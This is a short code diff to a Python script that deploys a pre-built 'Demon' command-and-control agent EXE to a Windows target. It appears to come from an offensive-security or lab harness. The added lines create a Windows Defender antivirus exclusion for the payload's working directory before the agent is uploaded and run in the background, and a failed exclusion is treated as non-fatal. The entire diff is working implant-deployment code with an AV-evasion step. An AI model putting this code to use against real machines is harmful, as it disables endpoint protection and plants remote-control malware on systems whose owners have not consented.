@@ -57,7 +57,7 @@ def _unique_marker() -> str:
 
 def _deploy_windows(target, uid, raw: bytes):
     """Deploy pre-built Demon EXE to Windows target.  Returns remote_payload path."""
-    from lib.deploy import ensure_work_dir, execute_background, upload
+    from lib.deploy import defender_add_exclusion, ensure_work_dir, execute_background, upload
 
     remote_payload = f"{target.work_dir}\\agent-{uid}.exe"
     _fd, local_payload = tempfile.mkstemp(suffix=".exe")
@@ -70,6 +70,12 @@ def _deploy_windows(target, uid, raw: bytes):
         fh.write(raw)
     try:
         ensure_work_dir(target)
+        try:
+            print(f"  [windows] adding Defender AV exclusion for {target.work_dir!r}")
+            defender_add_exclusion(target, target.work_dir)
+            print("  [windows] exclusion added (or Defender is disabled — both are fine)")
+        except Exception as exc:
+            print(f"  [windows] Defender exclusion failed (non-fatal): {exc}")
         upload(target, local_payload, remote_payload)
         print(f"  [windows] uploaded → {remote_payload}")
         execute_background(target, remote_payload)
